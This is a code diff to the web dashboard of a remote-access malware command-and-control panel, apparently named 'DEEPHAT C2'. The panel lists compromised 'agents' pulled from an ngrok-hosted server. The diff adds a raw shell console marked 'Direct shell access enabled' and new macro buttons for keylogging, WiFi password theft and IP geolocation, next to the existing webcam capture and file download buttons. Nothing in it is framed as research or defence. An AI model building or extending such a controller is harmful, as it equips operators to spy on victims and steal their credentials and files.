@@ -84,6 +84,7 @@
             height: 100%;
             display: flex;
             align-items: center;
+            justify-content: center;
         }
 
         .macro-btn:hover {
@@ -149,14 +150,18 @@
                 <p class="small text-muted mb-1 text-uppercase fw-bold">Target Agent</p>
                 <p id="target-agent-id" class="agent-id text-info">--</p>
 
-                <div class="mb-4">
-                    <label class="form-label small fw-bold text-uppercase">Command Payload</label>
-                    <textarea id="command-payload" class="form-control" rows="3" placeholder="Enter custom arguments..."></textarea>
-                    <div class="form-text text-warning" style="font-size: 0.7rem;">Required for specific shell or file tasks.</div>
+                <div class="mt-4">
+                    <label class="form-label small fw-bold text-uppercase text-danger">Command Console</label>
+                    <p class="text-muted small" style="font-size: 0.7rem;">Enter raw shell commands (e.g., dir, ipconfig, whoami)</p>
+                    <textarea id="command-payload" class="form-control" rows="4" placeholder="Enter raw command..."></textarea>
+                    <div class="form-text text-warning" style="font-size: 0.7rem;">Warning: Direct shell access enabled.</div>
                 </div>
 
                 <hr class="border-secondary">
-                <button class="btn btn-primary w-100 py-2" onclick="sendCommand('MANUAL_EXEC')">Execute Manual Command</button>
+                <div class="d-grid gap-2">
+                    <button class="btn btn-primary w-100 py-2 fw-bold" onclick="sendCommand('MANUAL_EXEC')">🚀 RUN COMMAND</button>
+                    <button class="btn btn-outline-secondary btn-sm w-100 mt-2" onclick="clearPayload()">Clear Console</button>
+                </div>
             </div>
 
             <!-- Right Column: Macros -->
@@ -171,6 +176,9 @@
                     <div class="col-6">
                         <button class="btn btn-outline-info macro-btn w-100" onclick="sendCommand('MACRO_NET_SCAN')">🌐 Net Scan</button>
                     </div>
+                    <div class="col-6">
+                        <button class="btn btn-outline-info macro-btn w-100" onclick="sendCommand('MACRO_IP_GEOLOC')">📍 IP/Geo</button>
+                    </div>
 
                     <!-- Surveillance Group -->
                     <div class="col-6">
@@ -179,6 +187,9 @@
                     <div class="col-6">
                         <button class="btn btn-outline-primary macro-btn w-100" onclick="sendCommand('MACRO_CAM')">📷 Webcam</button>
                     </div>
+                    <div class="col-6">
+                        <button class="btn btn-outline-primary macro-btn w-100" onclick="sendCommand('MACRO_KEYLOG')">⌨️ Keylog</button>
+                    </div>
 
                     <!-- File System Group -->
                     <div class="col-6">
@@ -186,6 +197,9 @@
                     </div>
                     <div class="col-6">
                         <button class="btn btn-outline-success macro-btn w-100" onclick="sendCommand('MACRO_FILE_DOWNLOAD')">📥 Download</button>
+                    </div>
+                    <div class="col-6">
+                        <button class="btn btn-outline-success macro-btn w-100" onclick="sendCommand('MACRO_WIFI_PASS')">📶 WiFi Pass</button>
                     </div>
 
                     <!-- System Control Group -->
@@ -213,27 +227,21 @@
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 <script>
-    /**
-     * DEEPHAT C2 - FRONTEND CONFIG
-     */
     const API_BASE = "https://privacy-exile-stove.ngrok-free.dev"; 
     let selectedAgentId = "";
     const commandModal = new bootstrap.Modal(document.getElementById('commandModal'));
 
-    // Helper to generate standard headers for all requests
     const getHeaders = () => ({
         'Content-Type': 'application/json',
         'ngrok-skip-browser-warning': 'true'
     });
 
-    // 1. Fetch Agents List
     async function fetchAgents() {
         try {
             const response = await fetch(`${API_BASE}/dashboard/agents`, {
                 method: 'GET',
                 headers: getHeaders()
             });
-            
             if (!response.ok) throw new Error("Server unreachable");
             const agents = await response.json();
             renderAgents(agents);
@@ -244,17 +252,14 @@
         }
     }
 
-    // 2. Render Agents to UI
     function renderAgents(agents) {
         const container = document.getElementById('agent-container');
         container.innerHTML = '';
-
         const agentKeys = Object.keys(agents);
         if (agentKeys.length === 0) {
             container.innerHTML = '<div class="alert alert-dark text-center">No agents detected. Waiting for connections...</div>';
             return;
         }
-
         agentKeys.forEach(id => {
             const agent = agents[id];
             const card = document.createElement('div');
@@ -276,7 +281,6 @@
         });
     }
 
-    // 3. Command Functions
     function openCommandModal(id) {
         selectedAgentId = id;
         document.getElementById('target-agent-id').innerText = id;
@@ -284,9 +288,12 @@
         commandModal.show();
     }
 
+    function clearPayload() {
+        document.getElementById('command-payload').value = '';
+    }
+
     async function sendCommand(command) {
         const payload = document.getElementById('command-payload').value;
-        
         try {
             const response = await fetch(`${API_BASE}/dashboard/command`, {
                 method: 'POST',
@@ -297,7 +304,6 @@
                     payload: payload 
                 })
             });
-            
             const data = await response.json();
             if (data.status === 'success') {
                 console.log(`Command [${command}] sent to ${selectedAgentId}`);
@@ -318,19 +324,14 @@
                     method: 'DELETE',
                     headers: getHeaders()
                 });
-                
-                if (response.ok) {
-                    fetchAgents();
-                } else {
-                    alert("Error removing agent.");
-                }
+                if (response.ok) fetchAgents();
+                else alert("Error removing agent.");
             } catch (err) {
                 alert("Error removing agent.");
             }
         }
     }
 
-    // Auto-refresh every 5 seconds
     setInterval(fetchAgents, 5000);
     fetchAgents();
 </script>
